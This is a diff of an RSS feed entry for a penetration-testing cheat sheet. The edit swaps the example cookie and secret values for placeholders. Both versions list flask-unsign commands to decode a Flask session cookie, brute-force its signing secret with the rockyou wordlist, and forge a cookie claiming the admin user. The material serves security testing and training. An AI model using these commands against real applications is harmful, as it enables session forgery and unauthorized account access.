@@ -12,7 +12,7 @@
       <link>https://tldrbins.github.io/flask_cookie/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/flask_cookie/</guid>
-      <description> Flask Cookie pip3 install flask-unsign # Decode flask cookie flask-unsign --decode --cookie &amp;#34;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdCJ9.Y7wAGA.VajtOMgdcxOwsp-puZW47au5H2k&amp;#34; # Brute force secret key flask-unsign --unsign --cookie &amp;#34;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdCJ9.Y7wAGA.VajtOMgdcxOwsp-puZW47au5H2k&amp;#34; -w /usr/share/wordlists/rockyou.txt --no-literal-eval # Forge flask cookie flask-unsign --sign --cookie &amp;#34;{&amp;#39;logged_in&amp;#39;: True, &amp;#39;username&amp;#39;: &amp;#39;admin&amp;#39;}&amp;#34; --secret &amp;#34;secret123&amp;#34; </description>
+      <description> Flask Cookie pip3 install flask-unsign # Decode flask cookie flask-unsign --decode --cookie &amp;lt;COOKIE&amp;gt; # Brute force secret key flask-unsign --unsign --cookie &amp;lt;COOKIE&amp;gt; -w /usr/share/wordlists/rockyou.txt --no-literal-eval # Forge flask cookie flask-unsign --sign --cookie &amp;lt;COOKIE_DATA&amp;gt; --secret &amp;lt;SECRET&amp;gt; </description>
     </item>
   </channel>
 </rss>
